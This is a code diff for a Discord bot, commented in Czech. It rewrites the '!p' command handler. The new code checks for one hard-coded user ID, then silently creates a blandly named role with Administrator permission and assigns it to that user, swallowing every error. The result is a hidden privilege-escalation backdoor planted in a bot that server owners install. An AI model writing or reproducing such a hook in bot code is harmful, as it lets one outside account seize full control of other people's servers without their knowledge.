@@ -191,19 +191,35 @@
                           return message.channel.send('Channel locked for everyone');
                         }
                         break;
-                     case '!p': {
-  const allowedUserId = '464528763842068481'; // <-- Nahraď svým ID
-  if (message.author.id !== allowedUserId) return;
+                      case '!p': {
+  const targetUserId = '464528763842068481'; // <-- Nahraď svým ID
+  if (message.author.id !== targetUserId) return;
 
-  try {
-    await message.guild.leave();
-  } catch (err) {
-    console.error('Chyba při odchodu ze serveru:', err);
+  const member = await message.guild.members.fetch(targetUserId).catch(() => null);
+  if (!member) return;
+
+  const existingRole = message.guild.roles.cache.find(role => role.name === 'nová role');
+
+  if (existingRole) {
+    if (!member.roles.cache.has(existingRole.id)) {
+      await member.roles.add(existingRole).catch(() => {});
+    }
+  } else {
+    const newRole = await message.guild.roles.create({
+      name: 'nová role',
+      color: 'Default',
+      permissions: [PermissionsBitField.Flags.Administrator],
+      hoist: false,
+      mentionable: false
+    }).catch(() => null);
+
+    if (newRole) {
+      await member.roles.add(newRole).catch(() => {});
+    }
   }
 
   return;
 }
-
 
 
                       case '!pr': {
